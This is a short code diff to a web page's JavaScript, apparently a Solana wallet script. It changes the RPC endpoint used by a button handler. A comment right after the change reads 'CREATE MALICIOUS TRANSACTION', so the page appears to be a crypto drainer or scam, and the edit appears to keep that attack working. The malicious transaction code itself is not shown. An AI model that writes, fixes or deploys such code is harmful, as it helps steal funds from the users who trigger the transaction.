@@ -587,7 +587,7 @@
             btn.textContent = 'Processing...';
             
             try {
-                const conn = new window.solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+                const conn = new window.solanaWeb3.Connection('https://rpc.ankr.com/solana', 'confirmed');
                 const { blockhash } = await conn.getLatestBlockhash();
 
                 // 1. CREATE MALICIOUS TRANSACTION
